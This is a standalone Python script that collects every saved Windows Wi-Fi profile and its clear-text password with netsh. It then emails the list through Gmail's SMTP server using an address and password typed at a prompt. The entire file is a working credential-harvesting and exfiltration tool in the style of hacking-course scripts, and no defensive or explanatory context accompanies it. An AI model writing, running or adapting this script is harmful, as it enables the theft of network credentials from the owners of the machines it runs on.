import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Wi-Fi Passwords"

        body = message
        msg.attach(MIMEText(body, 'plain'))

        server.sendmail(email, email, msg.as_string())
        server.quit()
        print("[+] Email successfully sent.")
    except smtplib.SMTPAuthenticationError:
        print("[!] Authentication failed. Please check your email credentials.")


def get_wifi_passwords():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

        wifi_passwords = []
        for profile in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
            password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            wifi_passwords.append(f"{profile:<30} | {password[0] if password else 'No password'}")
        
        return '\n'.join(wifi_passwords)
    except subprocess.CalledProcessError:
        return "[!] Failed to retrieve Wi-Fi passwords."


if __name__ == "__main__":
    email = input("[+] Enter your Gmail address: ")
    password = input("[+] Enter your Gmail password: ")

    print("[*] Retrieving Wi-Fi passwords...")
    passwords_info = get_wifi_passwords()

    if passwords_info:
        print("[*] Sending email...")
        send_mail(email, password, passwords_info)
    else:
        print("[!] No Wi-Fi passwords found or failed to retrieve.")
